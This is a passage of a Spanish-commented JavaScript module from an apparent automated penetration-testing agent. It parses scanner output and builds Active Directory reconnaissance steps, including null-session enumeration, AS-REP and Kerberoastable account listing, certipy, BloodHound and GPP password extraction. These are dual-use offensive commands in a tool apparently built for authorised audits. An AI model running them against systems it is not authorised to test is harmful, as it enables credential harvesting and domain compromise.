      remediation: "Deshabilitar los protocolos listados en la configuración del servidor web/balanceador, dejando como mínimo TLS 1.2 y, si el stack lo soporta, TLS 1.3 únicamente.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Semgrep — análisis estático real cuando una sonda de exposición filtra
 * código fuente reconstruible (no solo config/.env), en vez de las 4
 * firmas regex a mano de JS_CODE_DANGER_SIGNATURES. Se dispara desde
 * agent.js contra el texto CRUDO de cualquier paso (no el blob acumulado
 * completo, para no repetir el mismo hallazgo N veces) cuando ese texto
 * pinta como código fuente real.
 * ------------------------------------------------------------------------ */
// <?php es señal suficiente por sí sola: el literal casi nunca aparece
// fuera de un fichero PHP real (a diferencia de "function"/"class", que
// sí pueden colarse en prosa de error genérica).
const STRONG_SOURCE_SIGN = /<\?php\b/;

const SOURCE_CODE_SIGNS = [
  /^\s*(import|from)\s+[\w.]+\s+(import|as)\b/m,
  /^\s*def\s+\w+\s*\(/m,
  /^\s*(function|class)\s+\w+/m,
  /^\s*(const|let|var)\s+\w+\s*=\s*require\(/m,
  /^\s*public\s+(class|function|static)\b/m,
  /\$\w+\s*=\s*\$_(?:GET|POST|REQUEST|SERVER)\[/,
  /^\s*(if|foreach|while)\s*\(.{0,80}\)\s*\{/m,
];

/**
 * Filtro barato antes de gastar el análisis caro (semgrep): exige una
 * señal fuerte de lenguaje real (p. ej. <?php) o varias señales débiles
 * combinadas, más un tamaño mínimo — evita disparar sobre un mensaje de
 * error genérico que mencione "function" de pasada.
 */
export function looksLikeSourceCode(text) {
  const t = String(text || "");
  if (t.length < 120) return false;
  if (STRONG_SOURCE_SIGN.test(t)) return true;
  let hits = 0;
  for (const re of SOURCE_CODE_SIGNS) {
    if (re.test(t)) hits += 1;
    if (hits >= 2) return true;
  }
  return false;
}

/** Extensión aproximada para que semgrep elija el parser correcto. */
export function guessSourceExtension(text) {
  const t = String(text || "");
  if (STRONG_SOURCE_SIGN.test(t)) return ".php";
  if (/^\s*def\s+\w+\s*\(/m.test(t) || /^\s*(import|from)\s+[\w.]+\s+(import|as)\b/m.test(t)) return ".py";
  if (/^\s*public\s+(class|static)\b/m.test(t)) return ".java";
  if (/^\s*(const|let|var)\s+\w+\s*=\s*require\(/m.test(t) || /^\s*(function|class)\s+\w+/m.test(t)) return ".js";
  return ".txt";
}

const SEMGREP_SEVERITY_MAP = { ERROR: "High", WARNING: "Medium", INFO: "Low" };

/**
 * Parsea `semgrep --json`: cada `results[]` ya es un match real de una
 * regla (no una sospecha), con su propio CWE/OWASP en `extra.metadata`.
 * Máximo 8 por archivo escaneado — evita un solo leak generando decenas
 * de findings casi idénticos.
 */
export function semgrepFindings(stdout, filename) {
  let json;
  try {
    json = JSON.parse(String(stdout || ""));
  } catch {
    return [];
  }
  const results = Array.isArray(json.results) ? json.results : [];
  const out = [];
  for (const r of results) {
    const extra = r.extra || {};
    const meta = extra.metadata || {};
    const cwe = Array.isArray(meta.cwe) ? meta.cwe[0] : (meta.cwe || null);
    const owasp = Array.isArray(meta.owasp) ? meta.owasp[0] : (meta.owasp || null);
    const line = r.start && r.start.line;
    out.push({
      title: `Semgrep: ${extra.message ? extra.message.slice(0, 80).trim() : (r.check_id || "hallazgo")} (${filename}${line ? `:${line}` : ""})`,
      severity: SEMGREP_SEVERITY_MAP[extra.severity] || "Medium",
      description: `Regla «${r.check_id || "?"}» de semgrep confirmó un match real en código fuente filtrado (${filename}${line ? `, línea ${line}` : ""}).${cwe ? ` ${cwe}.` : ""} ${extra.message || ""}`.trim(),
      remediation: (extra.fix ? `Fix sugerido por la propia regla: ${extra.fix}. ` : "") + `Revisar y corregir el patrón exacto en ${filename}${line ? ` (línea ${line})` : ""}.${owasp ? ` Categoría: ${owasp}.` : ""}`,
    });
    if (out.length >= 8) break;
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * Nikto — el playbook ya lo corre 120 s (p2-nikto) pero el motor solo
 * emitía UN hallazgo genérico si el blob mencionaba "vulnerability".
 * Parseo de las líneas "+ …" (formato por defecto): una ficha por check
 * con ruta/CVE cuando Nikto las deja, sin inventar exploits.
 * ------------------------------------------------------------------------ */
const NIKTO_SKIP_RE = /no cgi directories|item\(s\) reported|start time|end time|target ip|target hostname|target port|^server:\s|retrieved x-powered-by|multiple i(?:ndex )?files|uncommon header|cookie .+ flag|allowed http methods|0 host\(s\) tested/i;
// Cabeceras HTTP ya cubiertas por heurísticas propias; Nikto suele pegar
// la URL de MDN tras "See:", que el path-matcher antiguo tomaba como ruta.
const NIKTO_HEADER_DUP_RE = /x-frame-options|x-content-type-options|strict-transport-security|content-security-policy|x-xss-protection|referrer-policy|permissions-policy|cross-origin-(?:opener|embedder|resource)-policy|header is not present|header is not set|anti-clickjacking|suggested security header missing/i;

/** Ruta del check Nikto (inicio de línea), nunca la URL de documentación. */
function niktoExtractPath(line) {
  const cleaned = String(line || "")
    .replace(/\bSee:\s*https?:\/\/\S+/gi, "")
    .replace(/https?:\/\/\S+/gi, "");
  const m = cleaned.match(
    /^(?:OSVDB-\d+:\s*|CVE-\d{4}-\d+:\s*|\[\d+\]\s*)?(\/[A-Za-z0-9._~-][A-Za-z0-9._~/-]{0,80})/,
  );
  if (!m) return "";
  const p = m[1].replace(/[),.;:]+$/, "");
  if (/^\/\//.test(p)) return "";
  if (/mozilla\.org|github\.com|cirt\.net|owasp\.org|w3\.org/i.test(p)) return "";
  return p;
}

/** Título corto en ES; la línea cruda de Nikto queda en description. */
function niktoShortTitle(line, path, cveM, osvdbM) {
  const p = path || "";
  const cve = cveM ? cveM[0].toUpperCase() : "";
  const osvdb = osvdbM ? osvdbM[0].toUpperCase() : "";
  if (cve) return p ? `Nikto: ${cve} en ${p}` : `Nikto: ${cve}`;
  if (/phpinfo/i.test(line)) return p ? `Nikto: phpinfo() en ${p}` : "Nikto: phpinfo() expuesto";
  if (/directory indexing|index of/i.test(line)) {
    return p ? `Nikto: listado de directorio en ${p}` : "Nikto: listado de directorio";
  }
  if (/config\.(inc|php)|wp-config|database IDs and passwords/i.test(line)) {
    return p ? `Nikto: configuración expuesta en ${p}` : "Nikto: configuración expuesta";
  }
  if (/\.bak|backup/i.test(line)) return p ? `Nikto: backup accesible en ${p}` : "Nikto: backup accesible";
  if (/\.git/i.test(line)) return p ? `Nikto: .git expuesto en ${p}` : "Nikto: .git expuesto";
  if (/passwd/i.test(line)) return p ? `Nikto: passwd en ${p}` : "Nikto: passwd expuesto";
  if (/default file|README/i.test(line)) {
    return p ? `Nikto: fichero por defecto en ${p}` : "Nikto: fichero por defecto";
  }
  if (/might be interesting/i.test(line)) {
    return p ? `Nikto: ruta interesante ${p}` : "Nikto: ruta interesante";
  }
  if (osvdb && p) return `Nikto: ${osvdb} en ${p}`;
  if (p && p !== "/") return `Nikto: superficie en ${p}`;
  if (osvdb) return `Nikto: ${osvdb}`;
  return "Nikto: check confirmado";
}

export function niktoFindings(stdout) {
  const out = [];
  const seen = new Set();
  for (const raw of String(stdout || "").split("\n")) {
    const line = raw.replace(/^\+\s*/, "").trim();
    if (!line || NIKTO_SKIP_RE.test(line) || NIKTO_HEADER_DUP_RE.test(line)) continue;
    const cveM = line.match(/CVE-\d{4}-\d+/i);
    const osvdbM = line.match(/OSVDB-\d+/i);
    const path = niktoExtractPath(line);
    // Nikto a veces confirma la ruta Y filtra un secreto real en la misma
    // línea (p. ej. "/webcgi/: ... The key is: AIza..."); sin esto, un
    // secreto real quedaba escondido bajo el título/severidad genéricos de
    // "superficie". Reusa el mismo catálogo que jsSecretFindings.
    let secretSig = null;
    for (const sig of JS_SECRET_SIGNATURES) {
      if (sig.re.test(line)) { secretSig = sig; break; }
    }
    if (!path && !cveM && !osvdbM && !secretSig) continue;
    let severity = "Low";
    if (cveM) severity = "High";
    else if (/phpinfo|config\.(inc|php)|wp-config|\.bak|\.git|passwd|backup/i.test(line)) severity = "High";
    else if (/directory indexing|index of/i.test(line)) severity = "Medium";
    else if (osvdbM && path) severity = "Medium";
    if (secretSig) severity = secretSig.severity || "High";
    const title = secretSig
      ? (path ? `Nikto: ${secretSig.label} expuesta en ${path}` : `Nikto: ${secretSig.label} expuesta`)
      : niktoShortTitle(line, path, cveM, osvdbM);
    const key = `${severity}|${(path || cveM?.[0] || osvdbM?.[0] || title).toLowerCase()}`;
    if (seen.has(key)) continue;
    seen.add(key);
    const refs = [cveM && cveM[0], osvdbM && osvdbM[0]].filter(Boolean).join(", ");
    out.push({
      title,
      severity,
      description: `Nikto confirmó este check contra la respuesta real del servicio: ${line}${refs ? ` Referencia ${refs}.` : ""}`,
      remediation: secretSig
        ? `Rotar de inmediato esta credencial (${secretSig.label}, ${secretSig.cwe}): quedó expuesta en texto plano en ${path || "una ruta pública"}. Retirar la ruta del document root o autenticarla; no depender de que no esté enlazada.`
        : cveM
          ? `Revisar ${cveM[0]} y aplicar el parche o el hardening que cierra ese check. Re-ejecutar nikto sobre la misma ruta para verificar el cierre.`
          : path
            ? `Revisar ${path}: retirar del document root, autenticar o desactivar el listado. No depender de que la ruta no esté enlazada.`
            : "Aplicar el control que Nikto señaló y verificar con la misma sonda.",
    });
    if (out.length >= 8) break;
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * dnsrecon -t std — enumeración DNS + intento de transferencia de zona.
 * No se usa -t brt (fuerza bruta de nombres): solo el plano que el NS
 * ya publica o, si el AXFR está abierto, el que entrega entero.
 * ------------------------------------------------------------------------ */
export function dnsreconArgs(root) {
  return ["-d", root, "-t", "std"];
}

const DNSRECON_RR = /^(?:\[(?:\*|\+|-)\]\s+)?(SOA|NS|MX|A|AAAA|CNAME|PTR|SRV)\s+(\S+)/i;

function looksLikeDnsName(token) {
  const t = String(token || "").replace(/\.$/, "").toLowerCase();
  if (!t || t.length > 253) return "";
  if (/^\d{1,3}(?:\.\d{1,3}){3}$/.test(t)) return "";
  if (!/^[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?\.[a-z]{2,}$/i.test(t)) return "";
  return t;
}

export function dnsreconFindings(stdout, root) {
  const text = String(stdout || "");
  const apex = String(root || "").replace(/\.$/, "").toLowerCase();
  const out = [];
  if (/zone transfer (was )?successful/i.test(text)) {
    out.push({
      title: `Transferencia de zona DNS exitosa (dnsrecon) en ${apex || "el dominio"}`,
      severity: "High",
      description: `dnsrecon -t std obtuvo una transferencia de zona (AXFR) contra un NS de ${apex || "este dominio"}: el servidor entregó el plano DNS completo. Eso es inventario autoritativo (hosts, MX, internos), no un rumor de scanner (CWE-200).`,
      remediation: "Deshabilitar AXFR hacia internet en todos los NS autoritativos (allow-transfer a IPs de esclavos, o none). Re-ejecutar dnsrecon -d <dominio> -t std hasta que el AXFR falle.",
    });
  }
  const seen = new Set();
  const extras = [];
  for (const raw of text.split("\n")) {
    const line = raw.replace(/^\[[*+-]\]\s+/, "").trim();
    const m = line.match(DNSRECON_RR);
    if (!m) continue;
    const name = looksLikeDnsName(m[2]);
    if (!name || name === apex || seen.has(name)) continue;
    seen.add(name);
    extras.push(`${m[1].toUpperCase()} ${name}`);
    if (extras.length >= 8) break;
  }
  if (extras.length) {
    out.push({
      title: `dnsrecon: ${extras.length} hostname(s) extra(s) en ${apex || "el dominio"}`,
      severity: "Info",
      description: `Enumeración DNS estándar (dnsrecon -t std, sin fuerza bruta de nombres) listó hosts distintos del ápice: ${extras.join("; ")}. Inventario de superficie, no vulnerabilidad por sí solo.`,
      remediation: "Ninguna por sí sola: confirmar con el cliente que esos nombres están en alcance. Retirar del DNS público lo que no deba resolverse desde internet.",
    });
  }
  return out;
}

/* ------------------------------------------------------------------------ *
 * WPScan — el playbook ya lo corre si isWordpress (p2-wpscan + plugins).
 * Parseo de la salida clásica CLI: versión Insecure, bloques [!] Title
 * con CVE, xmlrpc, usuarios. Sin payloads extra ni enumeración más agresiva.
 * ------------------------------------------------------------------------ */
export function wpscanFindings(stdout) {
  const text = String(stdout || "");
  const out = [];
  const seen = new Set();
  const add = (f) => {
    const key = String(f.title || "").toLowerCase();
    if (!key || seen.has(key)) return;
    seen.add(key);
    out.push(f);
  };

  const ver = text.match(/WordPress version\s+([\d.]+)\s+identified\s+\(Insecure/i);
  if (ver) {
    add({
      title: `WPScan: WordPress ${ver[1]} (Insecure)`,
      severity: "Medium",
      description: `WPScan identificó WordPress ${ver[1]} como Insecure (hay una versión más reciente publicada). No es explotación: es inventario de componente desactualizado (CWE-1035).`,
      remediation: "Actualizar el core de WordPress al último parche del branch soportado y re-ejecutar wpscan --url … hasta que deje de marcar Insecure.",
    });
  }

  for (const block of text.split(/(?=^\[!\] Title:)/m)) {
    const tm = block.match(/^\[!\] Title:\s*(.+)$/m);
    if (!tm) continue;
    const name = tm[1].trim().replace(/\s+/g, " ").slice(0, 90);
    const cveM = block.match(/CVE-\d{4}-\d+/i);
    add({
      title: `WPScan: ${name}`,
      severity: cveM ? "High" : "Medium",
      description: `WPScan confirmó «${name}» contra la respuesta real del WordPress.${cveM ? ` Referencia ${cveM[0]}.` : ""}`,
      remediation: cveM
        ? `Revisar ${cveM[0]} y aplicar el parche del plugin, tema o core. Re-ejecutar wpscan sobre la misma URL.`
        : "Actualizar el componente citado y re-ejecutar wpscan hasta que desaparezca el bloque [!] Title.",
    });
    if (out.length >= 8) break;
  }

  if (/xmlrpc\.php/i.test(text) && /xml-rpc|xmlrpc is enabled|found:\s*\n\s*\|\s*\*.*xmlrpc/i.test(text)) {
    add({
      title: "WPScan: xmlrpc.php habilitado",
      severity: "Low",
      description: "WPScan encontró xmlrpc.php respondiendo. El endpoint permite pingbacks y, si no está restringido, fuerza bruta de credenciales en bloque. No es un exploit: es superficie WordPress conocida (CWE-200).",
      remediation: "Desactivar xmlrpc.php (filtro, plugin o deny del servidor) si no se usa, o limitar por IP/autenticación. Verificar que GET/POST a /xmlrpc.php deje de ser útil.",
    });
  }

  const userIdx = text.search(/user\(s\) identified/i);
  if (userIdx >= 0) {
    const tail = text.slice(userIdx);
    const users = [];
    const seenU = new Set();
    for (const m of tail.matchAll(/^\[\+\]\s+([A-Za-z0-9._@-]{2,32})\s*$/gm)) {
      const u = m[1];
      if (/^https?:/i.test(u) || seenU.has(u.toLowerCase())) continue;
      seenU.add(u.toLowerCase());
      users.push(u);
      if (users.length >= 8) break;
    }
    if (!users.length) {
      for (const m of tail.matchAll(/^\s*\|\s*\d+\s*\|\s*([A-Za-z0-9._@-]{2,32})\s*\|/gm)) {
        const u = m[1];
        if (seenU.has(u.toLowerCase())) continue;
        seenU.add(u.toLowerCase());
        users.push(u);
        if (users.length >= 8) break;
      }
    }
    if (users.length) {
      add({
        title: `WPScan: ${users.length} usuario(s) enumerado(s)`,
        severity: "Info",
        description: `WPScan enumeró cuentas WordPress visibles: ${users.join(", ")}. Inventario de identidades, no compromiso de contraseña.`,
        remediation: "Ninguna por sí sola: evitar que author archives / ?author=N filtren logins; 2FA en cuentas privilegiadas.",
      });
    }
  }

  return out.slice(0, 8);
}

/* ------------------------------------------------------------------------ *
 * Active Directory — collection read-only (setup + inventario).
 * Espina: Orange Cyberdefense AD mindmap + Claude-AD — map before you
 * exploit. Fase 1 = null sessions. Sin spray, sin AS-REP hash dump, sin
 * WinRM shell automático. Se enciende si el blob/nmap huele a AD/SMB/DC.
 * Ref: https://orange-cyberdefense.github.io/ocd-mindmaps/
 * ------------------------------------------------------------------------ */

/** Puertos que delatan infraestructura AD (mindmap OCD / DC fingerprint). */
export const AD_SURFACE_PORTS = [53, 88, 135, 139, 389, 445, 636, 3268, 3269, 5985, 5986, 3389];

/**
 * Fingerprint AD SIEMPRE corre en fase 1, independiente de qué puertos haya
 * puesto el operador en el target. Sin esto, un target dado como IP/host
 * pelado (el caso más común en un engagement real de red) nunca toca
 * 445/389/88 — el nmap por defecto de la fase 1 solo cubre puertos web
 * (portSpec() cae a 80,443,8080,8443,8888), y toda la rama de collection AD
 * queda huérfana aunque el target SÍ sea un DC.
 */
export function adPortScanArgs(host) {
  return ["-sV", "-p", AD_SURFACE_PORTS.join(","), host];
}

/**
 * Una vez confirmado isAdTarget, sweep de seguimiento a los servicios que
 * el fingerprint inicial (arriba) no cubre: Global Catalog, AD Web
 * Services, y confirmación de WinRM. No repite los puertos ya escaneados.
 */
const AD_FOLLOWUP_PORTS = [3268, 3269, 5985, 5986, 9389];

export function adFollowupPortScanArgs(host) {
  return ["-sV", "-sC", "-p", AD_FOLLOWUP_PORTS.join(","), host];
}

const AD_PORT_OPEN_RE = /(?:^|\n)\s*(?:53|88|135|139|389|445|636|3268|3269|5985|5986)\/tcp\s+open\b/i;
const AD_BANNER_RE = /microsoft-ds|netbios-ssn|kerberos-sec|msrpc|Active Directory Domain Services|Domain Controllers?|Samba [23]\.\d|Windows Server (?:201[2-9]|202[2-5])|\[\*\]\s*Windows|\(domain:[A-Za-z0-9._-]+\)|Domain Name:\s*[A-Za-z0-9._-]+|defaultNamingContext:\s*DC=/i;

/**
 * Clasifica superficie AD a partir de la tabla nmap.
 * 88+389 abiertos juntos ≈ Domain Controller (confianza alta).
 */
export function classifyAdSurface(nmapText) {
  const { open } = parseNmapPortTable(nmapText);
  const ports = new Set(open.map((r) => r.port));
  const adPorts = AD_SURFACE_PORTS.filter((p) => ports.has(p));
  const likelyDc = ports.has(88) && ports.has(389);
  return {
    adPorts,
    likelyDc,
    hasKerberos: ports.has(88),
    hasLdap: ports.has(389) || ports.has(636),
    hasSmb: ports.has(445) || ports.has(139),
    hasRpc: ports.has(135),
    hasGc: ports.has(3268) || ports.has(3269),
    hasDns: ports.has(53),
    hasWinrm: ports.has(5985) || ports.has(5986),
    hasRdp: ports.has(3389),
  };
}

/** ¿Hay señal de AD/SMB/LDAP/DC en salidas acumuladas o en un flag explícito? */
export function detectAdSignals(blob, ctx = {}) {
  if (ctx.isAdTarget === true || ctx.isDomainController === true) return true;
  const text = String(blob || "");
  if (!text.trim()) return false;
  if (AD_PORT_OPEN_RE.test(text)) return true;
  if (AD_BANNER_RE.test(text)) return true;
  const c = classifyAdSurface(text);
  if (c.likelyDc || (c.hasSmb && c.hasLdap)) return true;
  return false;
}

export function detectDomainController(blob, ctx = {}) {
  if (ctx.isDomainController === true) return true;
  return classifyAdSurface(blob).likelyDc;
}

/**
 * Hallazgo cuando nmap muestra firma de Domain Controller (88+389).
 * Un DC expuesto a la red de escaneo es superficie crítica de perímetro.
 */
export function domainControllerFindings(nmapText) {
  const c = classifyAdSurface(nmapText);
  if (!c.likelyDc) return [];
  const extras = [];
  if (c.hasSmb) extras.push("445/SMB");
  if (c.hasRpc) extras.push("135/RPC");
  if (c.hasGc) extras.push("3268/GC");
  if (c.hasDns) extras.push("53/DNS");
  if (c.hasWinrm) extras.push("5985/WinRM");
  if (c.hasRdp) extras.push("3389/RDP");
  return [{
    title: "AD: Domain Controller probable (Kerberos 88 + LDAP 389)",
    severity: "High",
    description: `nmap ve TCP/88 (Kerberos) y TCP/389 (LDAP) abiertos a la vez: firma clásica de Domain Controller${extras.length ? `. También abiertos: ${extras.join(", ")}` : ""}. Un DC no debería ser alcanzable desde redes no confiables (CWE-284). Collection read-only sigue; no se ha atacado Kerberos ni WinRM.`,
    remediation: "Restringir 88/389/445/135/3268/5985 al segmento de administración o VPN. Si el engagement AD continúa, resolver el FQDN del dominio en /etc/hosts del operador (Kerberos falla sin nombre). Re-escanear desde fuera del admin net hasta que 88+389 queden filtered/closed.",
  }];
}

export function adCollectionSteps(step, host) {
  const h = String(host || "").trim();
  if (!h) return [];
  const skip = (c) => !c.isAdTarget;
  return [
    step("p1-ad-netexec-smb", "netexec", ["smb", h], null, {
      desc: "Fingerprint SMB/AD sin credenciales (netexec) — mindmap OCD Fase 1",
      skipIf: skip,
    }),
    step("p1-ad-netexec-guest-shares", "netexec", ["smb", h, "-u", "guest", "-p", "", "--shares"], null, {
      desc: "Shares SMB con guest/null (netexec) — null session",
      skipIf: skip,
    }),
    step("p1-ad-enum4linux", "enum4linux", ["-a", h], null, {
      desc: "Enumeración SMB/NetBIOS/LDAP anónima (enum4linux -a)",
      skipIf: skip,
    }),
    step("p1-ad-smbclient", "smbclient", ["-L", `//${h}`, "-N", "-g"], null, {
      desc: "Listado de shares SMB con sesión nula (smbclient -N)",
      skipIf: skip,
    }),
    step("p1-ad-rpcclient-users", "rpcclient", ["-U", "", "-N", h, "-c", "enumdomusers"], null, {
      desc: "RID/users vía RPC null session (rpcclient enumdomusers)",
      skipIf: skip,
    }),
    step("p1-ad-ldapsearch-rootdse", "ldapsearch", [
      "-x", "-H", `ldap://${h}`, "-s", "base", "-b", "",
      "(objectClass=*)", "namingContexts", "defaultNamingContext", "dnsHostName", "ldapServiceName",
    ], null, {
      desc: "rootDSE LDAP anónimo (null bind)",
      skipIf: skip,
    }),
  ];
}

/**
 * Fase 2 AD (auth-aware, sin crack ni shell):
 * - GetNPUsers -no-pass sobre usuarios de Fase 1 (AS-REP roastable).
 * - GetUserSPNs sin -request + certipy find -vulnerable si hay creds opcionales.
 */
export function adAuthCollectionSteps(step, host) {
  const h = String(host || "").trim();
  if (!h) return [];
  const domainOf = (c) => String(c.adDomain || "").trim();
  const skipAd = (c) => !c.isAdTarget;
  const skipCreds = (c) => !c.isAdTarget || !String(c.adUser || "").trim()
    || !String(c.adPassword || "").length || !domainOf(c);
  const steps = [];

  steps.push(
    step("p2-ad-lookupsid-null", "lookupsid.py", ["-no-pass", `@${h}`, "2000"], null, {
      desc: "RID cycling null (lookupsid -no-pass) — inventario SID",
      skipIf: skipAd,
    }),
    step("p2-ad-samrdump-null", "samrdump.py", ["-no-pass", `@${h}`], null, {
      desc: "Listado SAMR null (samrdump -no-pass)",
      skipIf: skipAd,
    }),
    step("p2-ad-lookupsid-auth", "lookupsid.py", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!d || !user || !pass) return null;
      return [`${d}/${user}:${pass}@${h}`, "2000"];
    }, null, {
      desc: "RID cycling autenticado (lookupsid)",
      skipIf: skipCreds,
    }),
    step("p2-ad-samrdump-auth", "samrdump.py", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!d || !user || !pass) return null;
      return [`${d}/${user}:${pass}@${h}`];
    }, null, {
      desc: "Listado SAMR autenticado (samrdump)",
      skipIf: skipCreds,
    }),
  );

  for (let i = 0; i < 5; i += 1) {
    const idx = i;
    steps.push(step(`p2-ad-asrep-${idx + 1}`, "GetNPUsers.py", (c) => {
      const u = (c.adUsers || [])[idx];
      const d = domainOf(c);
      if (!u || !d) return null;
      return [`${d}/${u}`, "-no-pass", "-dc-ip", h];
    }, null, {
      desc: `AS-REP check usuario #${idx + 1} (GetNPUsers -no-pass)`,
      skipIf: (c) => skipAd(c) || !(c.adUsers || [])[idx] || !domainOf(c),
    }));
  }

  steps.push(
    step("p2-ad-getuserspns", "GetUserSPNs.py", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!d || !user || !pass) return null;
      return [`${d}/${user}:${pass}`, "-dc-ip", h];
    }, null, {
      desc: "Listado SPN Kerberoastable (GetUserSPNs sin -request)",
      skipIf: skipCreds,
    }),
    step("p2-ad-certipy-find", "certipy", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!d || !user || !pass) return null;
      return ["find", "-u", `${user}@${d}`, "-p", pass, "-dc-ip", h, "-vulnerable", "-stdout"];
    }, null, {
      desc: "ADCS templates vulnerables (certipy find -vulnerable -stdout)",
      skipIf: skipCreds,
    }),
    step("p2-ad-nxc-users", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--users");
      return args;
    }, null, {
      desc: "Enumerar usuarios de dominio (netexec smb --users)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-groups", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--groups");
      return args;
    }, null, {
      desc: "Enumerar grupos de dominio (netexec smb --groups)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-passpol", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--pass-pol");
      return args;
    }, null, {
      desc: "Política de contraseñas del dominio (netexec --pass-pol)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-bloodhound-dconly", "bloodhound-python", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!d || !user || !pass) return null;
      return [
        "-c", "DCOnly",
        "-d", d,
        "-u", user,
        "-p", pass,
        "-dc", h,
        "--zip",
        "-op", "ds",
        "--auth-method", "ntlm",
      ];
    }, null, {
      desc: "BloodHound DCOnly (LDAP, sin sesiones en hosts) → zip en evidence",
      skipIf: skipCreds,
    }),
    step("p2-ad-finddelegation", "findDelegation.py", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!d || !user || !pass) return null;
      return [`${d}/${user}:${pass}`, "-dc-ip", h];
    }, null, {
      desc: "Delegación unconstrained/constrained/RBCD (findDelegation)",
      skipIf: skipCreds,
    }),
    step("p2-ad-nxc-computers", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--computers");
      return args;
    }, null, {
      desc: "Enumerar equipos de dominio (netexec smb --computers)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-dc-list", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["ldap", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--dc-list");
      return args;
    }, null, {
      desc: "Listar Domain Controllers (netexec ldap --dc-list)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-gpp", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "-M", "gpp_password");
      return args;
    }, null, {
      desc: "GPP cpassword en SYSVOL (netexec -M gpp_password) — solo lectura",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-gpp-autologin", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["smb", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "-M", "gpp_autologin");
      return args;
    }, null, {
      desc: "GPP autologon en SYSVOL (netexec -M gpp_autologin)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-ldap-trusts", "ldapsearch", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!d || !user || !pass) return null;
      const dn = adDomainToDn(d);
      if (!dn) return null;
      return [
        "-x", "-H", `ldap://${h}`,
        "-D", `${user}@${d}`,
        "-w", pass,
        "-b", `CN=System,${dn}`,
        "(objectClass=trustedDomain)",
        "cn", "flatName", "trustDirection", "trustType", "trustAttributes",
      ];
    }, null, {
      desc: "Trusts AD vía LDAP (objectClass=trustedDomain)",
      skipIf: skipCreds,
    }),
    step("p2-ad-nxc-passwd-notreq", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["ldap", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--password-not-required");
      return args;
    }, null, {
      desc: "Cuentas UF_PASSWD_NOTREQD (netexec ldap --password-not-required)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-admin-count", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["ldap", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--admin-count");
      return args;
    }, null, {
      desc: "Cuentas adminCount=1 (netexec ldap --admin-count)",
      skipIf: (c) => !c.isAdTarget || !String(c.adUser || "").trim() || !String(c.adPassword || "").length,
    }),
    step("p2-ad-nxc-trusted-deleg", "netexec", (c) => {
      const d = domainOf(c);
      const user = String(c.adUser || "").trim();
      const pass = String(c.adPassword || "");
      if (!user || !pass) return null;
      const args = ["ldap", h];
      if (d) args.push("-d", d);
      args.push("-u", user, "-p", pass, "--trusted-for-delegation");
      return args;
    }, null, {
      desc: "TRUSTED_FOR_DELEGATION (netexec ldap --trusted-for-delegation)",
